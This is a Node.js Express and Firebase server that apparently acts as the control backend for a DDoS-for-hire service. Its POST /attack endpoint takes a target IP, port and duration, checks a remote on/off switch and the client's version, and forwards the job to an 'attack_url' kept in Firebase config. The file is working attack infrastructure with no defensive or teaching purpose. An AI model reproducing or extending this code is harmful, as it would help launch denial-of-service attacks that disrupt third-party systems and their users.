require('dotenv').config()

const express = require('express')
const admin = require('firebase-admin')

const app = express()
app.use(express.json())

// ===== FIREBASE INIT (ENV JSON) =====
let serviceAccount
try {
    serviceAccount = JSON.parse(process.env.FIREBASE_KEY)
    // fix newline in private key
    serviceAccount.private_key = serviceAccount.private_key.replace(/\\n/g, '\n')
} catch (e) {
    console.error("FIREBASE_KEY parse error:", e.message)
    process.exit(1)
}

admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: process.env.FIREBASE_DB_URL
})

const db = admin.database()

// ===== SIMPLE IN-MEMORY CACHE =====
let cachedConfig = null
let lastFetch = 0
const CACHE_TTL = 5000 // 5s

async function getConfig() {
    const now = Date.now()
    if (cachedConfig && (now - lastFetch) < CACHE_TTL) {
        return cachedConfig
    }

    const snap = await db.ref('config').get()
    if (!snap.exists()) return null

    cachedConfig = snap.val()
    lastFetch = now
    return cachedConfig
}

// ===== CONFIG ENDPOINT =====
app.get('/config', async (req, res) => {
    try {
        const config = await getConfig()

        if (!config) {
            return res.status(404).json({ error: "Config not found" })
        }

        if (!config.status) {
            return res.status(403).json({ error: "Service disabled" })
        }

        res.json({
            attack_url: config.attack_url,
            version: config.version
        })

    } catch (err) {
        res.status(500).json({ error: err.message })
    }
})

// ===== ATTACK PROXY =====
app.post('/attack', async (req, res) => {
    const { ip, port, time } = req.body

    if (!ip || !port || !time) {
        return res.status(400).json({ error: "Invalid params" })
    }

    try {
        const config = await getConfig()

        if (!config || !config.status) {
            return res.status(403).json({ error: "Service OFF" })
        }

        // optional version check (client send header: version)
        const clientVersion = Number(req.headers['version'] || 0)
        if (config.version && clientVersion < config.version) {
            return res.status(426).json({ error: "Update required" })
        }

        const response = await fetch(`${config.attack_url}/attack`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ip, port, time })
        })

        const data = await response.text()

        res.status(response.status).send(data)

    } catch (err) {
        res.status(500).json({ error: err.message })
    }
})

// ===== HEALTH =====
app.get('/', (req, res) => {
    res.send("Backend running")
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
    console.log("Server running on port", PORT)
})